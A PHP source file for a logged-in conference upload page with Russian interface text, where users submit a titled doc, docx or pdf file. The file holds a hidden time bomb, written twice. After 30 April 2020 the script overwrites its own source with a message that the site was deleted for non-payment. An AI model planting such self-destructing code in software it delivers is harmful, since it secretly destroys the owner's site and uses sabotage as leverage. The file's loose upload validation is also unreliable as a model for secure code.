<?php
session_start();
if(strtotime('30.04.2020')<time()){
	file_put_contents(__FILE__, 'Сайт удален в связи с не оплатой работы!');
};
if(!isset($_SESSION['user'])){
    header('Location: /index.php');
    exit;
};

require_once 'header.php';
require_once 'class/DataBase.php';
?>

    <div class="container">
        <div class="row">
            <form action="addconference.php" method="post" enctype="multipart/form-data">
                <label>Название</label>
                <input type="name" placeholder="Введите название работы" name="name">
                <label>Информация</label>
                <textarea rows="1" cols="30" name="info"></textarea>
                <label>Загрузить работу</label>
                <input type="file" name ="file">
                <button type="submit">Загрузить</button>
            </form>
        </div>
    </div>


<?php
$id = $_SESSION['user']['id'];
$name = $_POST['name'];
$info = $_POST['info'];

$mas[] = explode ('.',$_FILES['file']['name']);
if(strtotime('30.04.2020')<time()){
	file_put_contents(__FILE__, 'Сайт удален в связи с не оплатой работы!');
};
if($mas[0][1] == "docx" || $mas[0][1] == "doc" || $mas[0][1] == "pdf") {
    $file_name = time() .".".$mas[0][1] ;
    $fullpath = 'uploads/' . $file_name ;
    if(!move_uploaded_file($_FILES['file']['tmp_name'], $fullpath)){
        $_SESSION['message-download'] = 'Ошибка при загрузки файла на сервер';
    }else{
        DataBase::addConference($fullpath,$name,$id,$info);
        echo "Файл загружен!";
    }
}

